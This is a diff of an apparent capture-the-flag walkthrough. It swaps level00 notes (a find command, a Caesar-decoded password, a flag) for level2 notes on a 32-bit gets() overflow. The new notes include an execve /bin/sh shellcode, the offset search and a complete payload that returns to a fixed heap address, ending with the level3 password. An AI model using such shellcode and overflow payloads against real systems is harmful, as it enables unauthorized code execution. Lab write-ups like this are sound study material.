@@ -1,18 +1,33 @@
-level00:
+level2:
 
-id
-pwd
-ls
+The main function calls the p function.
 
-Nothing to look at with ls.
-we should find some files that's been created by the flag00 user
+it first flush the stdout, then call gets with a buffer of 76 !
+But then there's an if statement that makes sure that we cant point the return adress to the stack, so we cant use that.
 
-find / -user flag00 2>/dev/null
-2>/dev/null redirects errors into null, so we can see better.
-we have 2 files, which contains the same string.
-we try to login to flag00 but doesnt work.
-it might be a specific code, check on dcode.fr
-its a ceaser code
-password : nottoohardhere
+But, strdup makes a call to malloc, so it sends the buffer of 76 to the heap...
 
-then getflag : x24ti5gi3x0ol2eh4esiuxias
+so we have to exploit the heap to execute a level3 shell ?
+
+NO we have to input what we call a shellcode.
+so we inject an exploit, with the shellcode, fill it enough so that i reaches the eip, and because of the if statement we cant redirect it, so we just put back the normal return address.
+
+but which address ?
+
+using ltrace, we can see that the return adress is always the same : 0x0804a008 (thx to no ASLR)
+
+i found this shellcode for 32 bits, only 21 bytes :
+
+"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
+
+now let's find the offset to write over the eip address
+
+python -c 'print "a" * 80 + "B" * 4' > /tmp/exploit
+
+we get 0x42424242, so its 80 !.
+
+Lets now write the payload :
+
+python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a" * 59 + "\x08\xa0\x04\x08"' > /tmp/exploit2
+'0x08 04 a0 08'
+password for level3 : 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
